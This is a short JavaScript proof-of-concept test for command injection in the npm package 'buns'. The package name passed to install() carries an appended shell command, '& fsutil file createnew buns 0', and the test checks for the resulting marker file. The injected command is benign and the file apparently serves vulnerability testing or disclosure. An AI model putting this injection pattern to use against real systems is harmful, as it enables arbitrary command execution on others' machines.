// test("Command Injection in buns", () => {
//   expect.assertions(2);
  var root = require("buns");
  const fs = require("fs");
  const path = "./buns";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  var name = "& fsutil file createnew buns 0";
  try {
    root.install(name);
  } catch (error) {
	  console.log(error)
  } finally {
    file_exist = fs.existsSync(path);
    console.log("{ " + file_exist + ", " + true + " }");
    fs.unlink(path, function (err) {});
  }
// });
